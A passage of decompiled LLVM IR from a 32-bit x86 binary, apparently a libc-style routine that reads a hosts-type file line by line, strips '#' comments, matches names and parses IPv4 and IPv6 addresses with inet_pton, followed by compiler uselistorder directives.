dec_label_pc_805471b.outer:                       ; preds = %dec_label_pc_80546f3, %dec_label_pc_80546fa, %dec_label_pc_80546d8, %dec_label_pc_8054605
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8054605 ], [ 2, %dec_label_pc_80546d8 ], [ 2, %dec_label_pc_80546fa ], [ 2, %dec_label_pc_80546f3 ]
  br label %dec_label_pc_805471b

dec_label_pc_805461c:                             ; preds = %dec_label_pc_805471b
  %v3_8054624 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8054624, i32* @eax, align 4
  %v1_805462c = icmp eq i32 %v3_8054624, 0
  br i1 %v1_805462c, label %dec_label_pc_8054633, label %dec_label_pc_8054630

dec_label_pc_8054630:                             ; preds = %dec_label_pc_805461c
  %v1_8054630 = inttoptr i32 %v3_8054624 to i8*
  store i8 0, i8* %v1_8054630, align 1
  br label %dec_label_pc_8054633

dec_label_pc_8054633:                             ; preds = %dec_label_pc_805461c, %dec_label_pc_8054630
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805467334 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805467335 = icmp eq i8 %v2_805467334, 0
  %v1_805467641 = icmp eq i1 %v3_805467335, false
  br i1 %v1_805467641, label %dec_label_pc_805463f.preheader.preheader, label %dec_label_pc_8054678

dec_label_pc_805463f.preheader.preheader:         ; preds = %dec_label_pc_8054633
  %v4_805463f98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805463f.preheader

dec_label_pc_805463b:                             ; preds = %dec_label_pc_8054645
  store i8 0, i8* %v1_805463f104, align 1
  %v0_805463e = load i32, i32* @ecx, align 4
  %v1_805463e = add i32 %v0_805463e, 1
  store i32 %v1_805463e, i32* @ecx, align 4
  %v1_805463f = inttoptr i32 %v1_805463e to i8*
  %v2_805463f = load i8, i8* %v1_805463f, align 1
  %v3_805463f = zext i8 %v2_805463f to i32
  %v4_805463f = load i32, i32* %eax.global-to-local, align 4
  %v5_805463f = and i32 %v4_805463f, -256
  %v6_805463f = or i32 %v5_805463f, %v3_805463f
  store i32 %v6_805463f, i32* @eax, align 4
  %v4_8054641 = icmp eq i8 %v2_805463f, 0
  br i1 %v4_8054641, label %dec_label_pc_805463f.dec_label_pc_8054678.loopexit_crit_edge, label %dec_label_pc_8054645

dec_label_pc_8054645:                             ; preds = %dec_label_pc_805463f.preheader, %dec_label_pc_805463b
  %v2_805463f105 = phi i8 [ %v2_805463f, %dec_label_pc_805463b ], [ %v2_805463f96, %dec_label_pc_805463f.preheader ]
  %v1_805463f104 = phi i8* [ %v1_805463f, %dec_label_pc_805463b ], [ %v1_805463f95, %dec_label_pc_805463f.preheader ]
  %v0_805463b103 = phi i32 [ %v1_805463e, %dec_label_pc_805463b ], [ %v0_805463f49, %dec_label_pc_805463f.preheader ]
  %v2_8054645 = sext i8 %v2_805463f105 to i32
  store i32 %v2_8054645, i32* @edx, align 4
  %v0_8054648 = load i32, i32* @global_var_805a438, align 8
  store i32 %v0_8054648, i32* %eax.global-to-local, align 4
  %v2_805464d = mul nsw i32 %v2_8054645, 2
  %v3_805464d = add i32 %v0_8054648, %v2_805464d
  %v4_805464d = inttoptr i32 %v3_805464d to i8*
  %v5_805464d = load i8, i8* %v4_805464d, align 1
  %v6_805464d = and i8 %v5_805464d, 32
  %v7_805464d = icmp eq i8 %v6_805464d, 0
  %v1_8054651 = icmp eq i1 %v7_805464d, false
  br i1 %v1_8054651, label %dec_label_pc_805463b, label %dec_label_pc_8054653

dec_label_pc_8054653:                             ; preds = %dec_label_pc_8054645
  %v0_8054653 = load i32, i32* @edi, align 4
  %v1_8054653 = add i32 %v0_8054653, -6
  %v6_8054653 = sub i32 5, %v0_8054653
  %v7_8054653 = and i32 %v6_8054653, %v0_8054653
  %v8_8054653 = icmp slt i32 %v7_8054653, 0
  %v9_8054653 = icmp eq i32 %v1_8054653, 0
  %v10_8054653 = icmp slt i32 %v1_8054653, 0
  %v3_8054656 = icmp eq i1 %v10_8054653, %v8_8054653
  %v4_8054656 = icmp eq i1 %v9_8054653, false
  %v5_8054656 = and i1 %v4_8054656, %v3_8054656
  br i1 %v5_8054656, label %dec_label_pc_805465f.preheader, label %dec_label_pc_8054658

dec_label_pc_8054658:                             ; preds = %dec_label_pc_8054653
  %v1_8054658 = load i32, i32* @ebx, align 4
  %v3_8054658 = mul i32 %v0_8054653, 4
  %v4_8054658 = add i32 %v1_8054658, %v3_8054658
  %v5_8054658 = inttoptr i32 %v4_8054658 to i32*
  store i32 %v0_805463b103, i32* %v5_8054658, align 4
  %v0_805465b = load i32, i32* @edi, align 4
  %v1_805465b = add i32 %v0_805465b, 1
  store i32 %v1_805465b, i32* @edi, align 4
  %v0_805465f.pre.pre = load i32, i32* @ecx, align 4
  %v4_805465f.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805465f.preheader

dec_label_pc_805465f.preheader:                   ; preds = %dec_label_pc_8054658, %dec_label_pc_8054653
  %v4_805465f.pre = phi i32 [ %v4_805465f.pre.pre, %dec_label_pc_8054658 ], [ %v0_8054648, %dec_label_pc_8054653 ]
  %v0_805465f.pre = phi i32 [ %v0_805465f.pre.pre, %dec_label_pc_8054658 ], [ %v0_805463b103, %dec_label_pc_8054653 ]
  %v0_805467854 = phi i32 [ %v1_805465b, %dec_label_pc_8054658 ], [ %v0_8054653, %dec_label_pc_8054653 ]
  %v1_805465f106 = inttoptr i32 %v0_805465f.pre to i8*
  %v2_805465f107 = load i8, i8* %v1_805465f106, align 1
  %v3_805465f108 = zext i8 %v2_805465f107 to i32
  %v5_805465f109 = and i32 %v4_805465f.pre, -256
  %v6_805465f110 = or i32 %v3_805465f108, %v5_805465f109
  store i32 %v6_805465f110, i32* @eax, align 4
  %v4_8054661111 = icmp eq i8 %v2_805465f107, 0
  br i1 %v4_8054661111, label %dec_label_pc_8054673.loopexit, label %dec_label_pc_8054665.lr.ph

dec_label_pc_8054665.lr.ph:                       ; preds = %dec_label_pc_805465f.preheader
  %v0_8054668.pre = load i32, i32* @global_var_805a438, align 8
  br label %dec_label_pc_8054665

dec_label_pc_805465e:                             ; preds = %dec_label_pc_8054665
  %v1_805465e = add i32 %v0_8054673113, 1
  store i32 %v1_805465e, i32* @ecx, align 4
  %v1_805465f = inttoptr i32 %v1_805465e to i8*
  %v2_805465f = load i8, i8* %v1_805465f, align 1
  %v3_805465f = zext i8 %v2_805465f to i32
  %v5_805465f = and i32 %v0_8054668.pre, -256
  %v6_805465f = or i32 %v3_805465f, %v5_805465f
  store i32 %v6_805465f, i32* @eax, align 4
  %v4_8054661 = icmp eq i8 %v2_805465f, 0
  br i1 %v4_8054661, label %dec_label_pc_8054673.loopexit, label %dec_label_pc_8054665

dec_label_pc_8054665:                             ; preds = %dec_label_pc_8054665.lr.ph, %dec_label_pc_805465e
  %v2_805465f115 = phi i8 [ %v2_805465f107, %dec_label_pc_8054665.lr.ph ], [ %v2_805465f, %dec_label_pc_805465e ]
  %v1_805465f114 = phi i8* [ %v1_805465f106, %dec_label_pc_8054665.lr.ph ], [ %v1_805465f, %dec_label_pc_805465e ]
  %v0_8054673113 = phi i32 [ %v0_805465f.pre, %dec_label_pc_8054665.lr.ph ], [ %v1_805465e, %dec_label_pc_805465e ]
  %v2_8054665 = sext i8 %v2_805465f115 to i32
  store i32 %v2_8054665, i32* @edx, align 4
  store i32 %v0_8054668.pre, i32* @eax, align 4
  %v2_805466d = mul nsw i32 %v2_8054665, 2
  %v3_805466d = add i32 %v0_8054668.pre, %v2_805466d
  %v4_805466d = inttoptr i32 %v3_805466d to i8*
  %v5_805466d = load i8, i8* %v4_805466d, align 1
  %v6_805466d = and i8 %v5_805466d, 32
  %v7_805466d = icmp eq i8 %v6_805466d, 0
  br i1 %v7_805466d, label %dec_label_pc_805465e, label %dec_label_pc_8054673.loopexit

dec_label_pc_8054673.loopexit:                    ; preds = %dec_label_pc_8054665, %dec_label_pc_805465e, %dec_label_pc_805465f.preheader
  %v4_805463f98139 = phi i32 [ %v6_805465f110, %dec_label_pc_805465f.preheader ], [ %v6_805465f, %dec_label_pc_805465e ], [ %v0_8054668.pre, %dec_label_pc_8054665 ]
  %v0_8054673.lcssa = phi i32 [ %v0_805465f.pre, %dec_label_pc_805465f.preheader ], [ %v1_805465e, %dec_label_pc_805465e ], [ %v0_8054673113, %dec_label_pc_8054665 ]
  %v1_805465f.lcssa = phi i8* [ %v1_805465f106, %dec_label_pc_805465f.preheader ], [ %v1_805465f, %dec_label_pc_805465e ], [ %v1_805465f114, %dec_label_pc_8054665 ]
  %v2_8054673 = load i8, i8* %v1_805465f.lcssa, align 1
  %v3_8054673 = icmp eq i8 %v2_8054673, 0
  %v1_8054676 = icmp eq i1 %v3_8054673, false
  br i1 %v1_8054676, label %dec_label_pc_805463f.preheader, label %dec_label_pc_8054678

dec_label_pc_805463f.preheader:                   ; preds = %dec_label_pc_805463f.preheader.preheader, %dec_label_pc_8054673.loopexit
  %v0_8054678.pre142 = phi i32 [ %v0_805467854, %dec_label_pc_8054673.loopexit ], [ 0, %dec_label_pc_805463f.preheader.preheader ]
  %v4_805463f98 = phi i32 [ %v4_805463f98139, %dec_label_pc_8054673.loopexit ], [ %v4_805463f98.pre, %dec_label_pc_805463f.preheader.preheader ]
  %v0_805463f49 = phi i32 [ %v0_8054673.lcssa, %dec_label_pc_8054673.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_805463f.preheader.preheader ]
  %v1_805463f95 = inttoptr i32 %v0_805463f49 to i8*
  %v2_805463f96 = load i8, i8* %v1_805463f95, align 1
  %v3_805463f97 = zext i8 %v2_805463f96 to i32
  %v5_805463f99 = and i32 %v4_805463f98, -256
  %v6_805463f100 = or i32 %v5_805463f99, %v3_805463f97
  store i32 %v6_805463f100, i32* @eax, align 4
  %v4_8054641101 = icmp eq i8 %v2_805463f96, 0
  br i1 %v4_8054641101, label %dec_label_pc_8054678, label %dec_label_pc_8054645

dec_label_pc_805463f.dec_label_pc_8054678.loopexit_crit_edge: ; preds = %dec_label_pc_805463b
  %v0_8054678.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054678

dec_label_pc_8054678:                             ; preds = %dec_label_pc_8054673.loopexit, %dec_label_pc_805463f.dec_label_pc_8054678.loopexit_crit_edge, %dec_label_pc_805463f.preheader, %dec_label_pc_8054633
  %v1_805467b = phi i32 [ 0, %dec_label_pc_8054633 ], [ %v0_8054678.pre.pre, %dec_label_pc_805463f.dec_label_pc_8054678.loopexit_crit_edge ], [ %v0_8054678.pre142, %dec_label_pc_805463f.preheader ], [ %v0_805467854, %dec_label_pc_8054673.loopexit ]
  %v0_805467b = load i32, i32* @ebx, align 4
  %v2_805467b = mul i32 %v1_805467b, 4
  %v3_805467b = add i32 %v0_805467b, %v2_805467b
  %v4_805467b = inttoptr i32 %v3_805467b to i32*
  store i32 0, i32* %v4_805467b, align 4
  %v7_8054682 = icmp sgt i32 %v1_805467b, 1
  br i1 %v7_8054682, label %dec_label_pc_8054688, label %dec_label_pc_805471b

dec_label_pc_8054688:                             ; preds = %dec_label_pc_8054678
  br i1 %v12_80544ba, label %dec_label_pc_8054755, label %dec_label_pc_8054693

dec_label_pc_8054693:                             ; preds = %dec_label_pc_8054688
  store i32 1, i32* @esi, align 4
  br i1 %v1_805469d, label %dec_label_pc_80546cb.preheader, label %dec_label_pc_805469f

dec_label_pc_80546cb.preheader:                   ; preds = %dec_label_pc_8054693
  %v1_80546cb119 = load i32, i32* @edi, align 4
  %v5_80546cd128 = icmp sgt i32 %v1_80546cb119, 1
  br i1 %v5_80546cd128, label %dec_label_pc_80546b5.lr.ph, label %dec_label_pc_805471b

dec_label_pc_80546b5.lr.ph:                       ; preds = %dec_label_pc_80546cb.preheader
  br label %dec_label_pc_80546b5

dec_label_pc_805469f:                             ; preds = %dec_label_pc_8054693
  %v0_805469f = load i32, i32* @eax, align 4
  %v0_80546a1 = load i32, i32* @ebx, align 4
  %v1_80546a1 = inttoptr i32 %v0_80546a1 to i32*
  %v2_80546a1 = load i32, i32* %v1_80546a1, align 4
  %v5_80546a7 = call i32 @__GI_strcoll(i8* %v2_80546be, i32 %v2_80546a1, i32 %v0_805469f, i32 %v0_805469f)
  store i32 %v5_80546a7, i32* %eax.global-to-local, align 4
  %v1_80546af = icmp eq i32 %v5_80546a7, 0
  %v1_80546b1 = icmp eq i1 %v1_80546af, false
  br i1 %v1_80546b1, label %dec_label_pc_805471b, label %dec_label_pc_80546d1

dec_label_pc_80546b5:                             ; preds = %dec_label_pc_80546b5.lr.ph, %dec_label_pc_80546ca
  %v1_80546b7129 = phi i32 [ 1, %dec_label_pc_80546b5.lr.ph ], [ %v1_80546ca, %dec_label_pc_80546ca ]
  %v0_80546b7 = load i32, i32* @ebx, align 4
  %v2_80546b7 = mul i32 %v1_80546b7129, 4
  %v3_80546b7 = add i32 %v0_80546b7, %v2_80546b7
  %v4_80546b7 = inttoptr i32 %v3_80546b7 to i32*
  %v5_80546b7 = load i32, i32* %v4_80546b7, align 4
  %v3_80546be = call i32 @__GI_strcasecmp(i8* %v2_80546be, i32 %v5_80546b7)
  store i32 %v3_80546be, i32* %eax.global-to-local, align 4
  %v1_80546c6 = icmp eq i32 %v3_80546be, 0
  br i1 %v1_80546c6, label %dec_label_pc_80546d1, label %dec_label_pc_80546ca

dec_label_pc_80546ca:                             ; preds = %dec_label_pc_80546b5
  %v0_80546ca = load i32, i32* @esi, align 4
  %v1_80546ca = add i32 %v0_80546ca, 1
  store i32 %v1_80546ca, i32* @esi, align 4
  %v1_80546cb = load i32, i32* @edi, align 4
  %v5_80546cd = icmp slt i32 %v1_80546ca, %v1_80546cb
  br i1 %v5_80546cd, label %dec_label_pc_80546b5, label %dec_label_pc_805471b

dec_label_pc_80546d1:                             ; preds = %dec_label_pc_805469f, %dec_label_pc_80546b5
  br i1 %v1_80546d6, label %dec_label_pc_80546f3, label %dec_label_pc_80546d8

dec_label_pc_80546d8:                             ; preds = %dec_label_pc_80546d1
  %v0_80546d8 = load i32, i32* @esi, align 4
  %v3_80546d9 = load i8*, i8** %stack_var_-44, align 4
  %v4_80546d9 = ptrtoint i8* %v3_80546d9 to i32
  %v0_80546dd = load i32, i32* @ebx, align 4
  %v1_80546dd = inttoptr i32 %v0_80546dd to i32*
  %v2_80546dd = load i32, i32* %v1_80546dd, align 4
  %v4_80546e1 = inttoptr i32 %v2_80546dd to i8*
  %v5_80546e1 = call i32 @inet_pton(i32 2, i8* %v4_80546e1, i32 %v4_80546d9, i32 %v0_80546d8)
  store i32 %v5_80546e1, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_80546e1, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8054571, label %dec_label_pc_805471b.outer

dec_label_pc_80546f3:                             ; preds = %dec_label_pc_80546d1
  br i1 %v1_80546f8, label %dec_label_pc_805471b.outer, label %dec_label_pc_80546fa

dec_label_pc_80546fa:                             ; preds = %dec_label_pc_80546f3
  %v0_80546fa = load i32, i32* @ecx, align 4
  %v0_80546ff = load i32, i32* @ebx, align 4
  %v1_80546ff = inttoptr i32 %v0_80546ff to i32*
  %v2_80546ff = load i32, i32* %v1_80546ff, align 4
  %v4_8054703 = inttoptr i32 %v2_80546ff to i8*
  %v5_8054703 = call i32 @inet_pton(i32 10, i8* %v4_8054703, i32 %stack_var_-36.0, i32 %v0_80546fa)
  store i32 %v5_8054703, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8054703, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_805459e, label %dec_label_pc_805471b.outer

dec_label_pc_805471b:                             ; preds = %dec_label_pc_80546cb.preheader, %dec_label_pc_80546ca, %dec_label_pc_8054678, %dec_label_pc_805469f, %dec_label_pc_805471b.outer
  %v0_805471b = load i32, i32* @edx, align 4
  %v3_8054725 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_805471b)
  store i32 %v3_8054725, i32* @eax, align 4
  %v1_805472d = icmp eq i32 %v3_8054725, 0
  %v1_805472f = icmp eq i1 %v1_805472d, false
  br i1 %v1_805472f, label %dec_label_pc_805461c, label %dec_label_pc_8054735

dec_label_pc_8054735:                             ; preds = %dec_label_pc_805471b, %dec_label_pc_80545ca
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_80545ca ], [ %stack_var_-28.0.ph, %dec_label_pc_805471b ]
  br i1 %v12_80544ba, label %dec_label_pc_8054755, label %dec_label_pc_805473c

dec_label_pc_805473c:                             ; preds = %dec_label_pc_8054735
  %v1_8054743 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8054743 = call i32 @__GI_fclose(i16* %v1_8054743)
  store i32 %v2_8054743, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054755

dec_label_pc_8054755:                             ; preds = %dec_label_pc_8054688, %dec_label_pc_80544a5, %dec_label_pc_80544b1, %dec_label_pc_80544cf, %dec_label_pc_80544e2, %dec_label_pc_80544ee, %dec_label_pc_80544f7, %dec_label_pc_8054521, %dec_label_pc_8054735, %dec_label_pc_805473c, %dec_label_pc_8054557
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8054735 ], [ %stack_var_-28.1, %dec_label_pc_805473c ], [ %v2_8054566, %dec_label_pc_8054557 ], [ 34, %dec_label_pc_8054521 ], [ 34, %dec_label_pc_80544f7 ], [ 34, %dec_label_pc_80544ee ], [ 34, %dec_label_pc_80544e2 ], [ 34, %dec_label_pc_80544cf ], [ 34, %dec_label_pc_80544b1 ], [ 34, %dec_label_pc_80544a5 ], [ %stack_var_-28.0.ph, %dec_label_pc_8054688 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8054490, i32* @ebx, align 4
  store i32 %v0_805448f, i32* @esi, align 4
  store i32 %v0_805448e, i32* @edi, align 4
  store i32 %v0_805448d, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_80546ca, { 0, 2, 1 }
  uselistorder i32 %v1_805467b, { 1, 0 }
  uselistorder i8 %v2_805463f96, { 1, 2, 0 }
  uselistorder i8* %v1_805463f95, { 1, 0 }
  uselistorder i32 %v0_805463f49, { 1, 0 }
  uselistorder i32 %v2_8054665, { 1, 0 }
  uselistorder i32 %v1_805465e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054668.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8054653, { 1, 0 }
  uselistorder i32 %v0_8054653, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8054645, { 1, 0 }
  uselistorder i8* %v2_80546be, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8054503, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80544e2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80544bf, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80544c6, { 1, 0 }
  uselistorder i32 %v1_80544a0, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 10, 0, 1, 16, 17, 15, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 14, 25, 26, 27, 0, 13, 7, 8, 18, 9, 28, 29, 1, 3, 22, 15, 23, 24, 10, 6, 19, 5, 20, 4, 21, 11, 12, 16, 17, 2 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 20, 21, 22, 23, 24, 16, 0, 7, 17, 13, 14, 15, 8, 25, 18, 19, 26, 27, 2, 11, 3, 9, 1, 12, 4, 10, 5, 6 }
  uselistorder i32* @global_var_805a438, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 71, 0, 72, 12, 19, 73, 75, 3, 37, 36, 2, 76, 77, 6, 78, 4, 79, 5, 80, 90, 8, 39, 38, 7, 53, 54, 81, 55, 56, 57, 58, 59, 60, 13, 61, 87, 88, 92, 14, 26, 15, 93, 94, 85, 84, 9, 25, 74, 82, 62, 63, 64, 65, 66, 67, 68, 10, 69, 70, 83, 20, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 16, 17, 18, 11, 86, 89, 91 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 10, { 19, 0, 27, 28, 29, 30, 31, 32, 1, 11, 20, 2, 7, 33, 8, 9, 10, 21, 3, 13, 25, 26, 12, 35, 22, 4, 18, 17, 14, 15, 6, 34, 23, 24, 16, 5 }
  uselistorder i32 12, { 74, 75, 76, 0, 77, 16, 39, 1, 78, 93, 23, 21, 6, 22, 7, 8, 9, 10, 11, 12, 13, 79, 57, 58, 59, 60, 61, 62, 63, 64, 2, 17, 18, 65, 66, 67, 127, 25, 40, 73, 92, 41, 42, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 43, 44, 45, 46, 47, 48, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 24, 126, 82, 83, 84, 85, 128, 68, 3, 4, 69, 70, 14, 15, 71, 5, 80, 81, 49, 50, 51, 52, 53, 19, 54, 55, 20, 56, 72, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 86, 87, 88, 89, 90, 91 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 6, 5, 11, 0, 12, 13, 14, 15, 2, 8, 3, 9, 4, 1, 16, 10, 7 }
  uselistorder i32 44, { 8, 9, 10, 5, 0, 6, 7, 20, 12, 4, 17, 19, 18, 14, 15, 16, 13, 11, 1, 2, 3 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 0, 1 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 14, 16, 17, 0, 7, 4, 1, 9, 5, 6, 10, 11, 12, 13, 3, 2, 15, 8 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 16, { 86, 85, 0, 87, 88, 13, 8, 89, 14, 90, 52, 53, 98, 99, 100, 101, 102, 103, 110, 104, 105, 106, 107, 108, 109, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 91, 92, 93, 94, 54, 55, 56, 57, 58, 59, 60, 61, 131, 15, 16, 28, 19, 42, 29, 37, 82, 38, 135, 1, 39, 40, 41, 3, 2, 129, 5, 4, 130, 7, 6, 121, 122, 17, 136, 95, 96, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 20, 77, 78, 79, 80, 132, 133, 134, 97, 12, 9, 27, 21, 43, 44, 45, 46, 47, 48, 49, 50, 51, 18, 22, 81, 30, 31, 32, 33, 34, 35, 36, 83, 84, 11, 23, 123, 124, 125, 126, 127, 24, 128, 10, 25, 26 }
  uselistorder i32 8, { 123, 122, 124, 0, 1, 125, 126, 127, 128, 129, 130, 7, 131, 2, 16, 132, 133, 134, 135, 32, 136, 90, 36, 18, 19, 20, 21, 37, 22, 23, 38, 39, 24, 40, 25, 41, 42, 138, 91, 92, 93, 94, 95, 96, 34, 33, 97, 98, 99, 100, 199, 200, 201, 29, 207, 30, 208, 31, 46, 26, 67, 121, 151, 68, 69, 153, 154, 155, 156, 157, 158, 159, 8, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 9, 70, 71, 72, 73, 74, 75, 76, 77, 170, 171, 172, 173, 174, 44, 10, 45, 11, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 43, 192, 193, 12, 194, 195, 196, 197, 13, 198, 145, 146, 3, 206, 101, 139, 140, 4, 5, 47, 102, 103, 104, 105, 107, 108, 109, 106, 110, 111, 112, 113, 27, 28, 114, 115, 116, 117, 118, 119, 202, 203, 204, 141, 142, 143, 144, 137, 205, 78, 6, 79, 80, 35, 81, 82, 83, 84, 85, 86, 87, 88, 89, 120, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 17, 147, 148, 149, 150, 152, 15, 14 }
  uselistorder i32 -36, { 1, 0 }
  uselistorder i32 -32, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 32, { 71, 0, 72, 73, 28, 30, 78, 29, 79, 80, 81, 42, 43, 60, 85, 31, 51, 53, 54, 55, 56, 5, 4, 6, 7, 44, 8, 9, 52, 10, 11, 12, 13, 14, 1, 76, 74, 75, 61, 62, 2, 63, 64, 65, 66, 67, 68, 69, 15, 70, 45, 83, 84, 77, 82, 57, 58, 59, 33, 16, 46, 47, 17, 48, 3, 19, 18, 34, 35, 49, 36, 20, 21, 23, 22, 37, 25, 24, 38, 40, 27, 26, 39, 41, 32, 50 }
  uselistorder i32 4, { 261, 262, 263, 257, 255, 256, 258, 259, 260, 0, 5, 264, 265, 266, 267, 268, 269, 270, 271, 272, 33, 54, 146, 147, 148, 34, 35, 36, 273, 49, 1, 187, 6, 7, 202, 203, 204, 205, 206, 207, 274, 275, 278, 279, 280, 281, 282, 283, 59, 284, 290, 291, 292, 68, 37, 293, 294, 295, 296, 38, 39, 40, 69, 41, 42, 70, 43, 297, 44, 298, 71, 45, 72, 73, 8, 285, 286, 74, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 55, 218, 369, 219, 370, 371, 377, 378, 383, 384, 385, 372, 50, 94, 161, 162, 373, 374, 375, 376, 9, 149, 150, 151, 152, 75, 242, 243, 244, 60, 309, 310, 311, 312, 153, 154, 155, 156, 157, 61, 10, 158, 159, 379, 381, 323, 324, 325, 326, 327, 328, 11, 329, 330, 331, 332, 333, 334, 335, 336, 321, 322, 163, 46, 164, 165, 166, 167, 168, 169, 170, 12, 172, 171, 337, 52, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 31, 358, 359, 53, 360, 13, 160, 380, 173, 174, 299, 300, 51, 301, 302, 303, 304, 2, 14, 3, 382, 15, 175, 220, 16, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 47, 48, 95, 76, 238, 239, 240, 287, 288, 56, 289, 276, 277, 77, 176, 177, 178, 17, 179, 18, 32, 19, 20, 180, 181, 21, 182, 78, 183, 79, 184, 80, 185, 81, 186, 188, 189, 190, 57, 191, 192, 193, 62, 63, 64, 194, 82, 83, 84, 85, 86, 65, 195, 87, 196, 66, 197, 198, 58, 199, 200, 201, 67, 241, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 92, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 88, 305, 306, 307, 308, 313, 22, 23, 314, 24, 89, 90, 93, 315, 91, 25, 26, 316, 317, 318, 319, 27, 4, 28, 29, 320, 30, 361, 362, 363, 364, 365, 366, 367, 368, 386, 387, 388, 145 }
  uselistorder i32* @ebp, { 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 9, 10, 11, 12, 13, 14, 15, 2, 86, 87, 88, 93, 89, 90, 91, 92, 94, 34, 35, 95, 99, 110, 111, 141, 142, 143, 36, 37, 38, 39, 40, 16, 17, 18, 69, 70, 192, 193, 194, 195, 196, 19, 20, 197, 198, 199, 200, 201, 202, 203, 204, 209, 205, 206, 207, 208, 1, 210, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 4, 41, 42, 43, 44, 45, 105, 0, 106, 107, 108, 109, 100, 101, 102, 103, 104, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 3, 62, 6, 7, 8, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 63, 64, 65, 96, 97, 98, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 66, 67, 68, 5, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 179, 180, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 211, 212, 213, 214, 217, 218, 215, 216, 219, 220 }
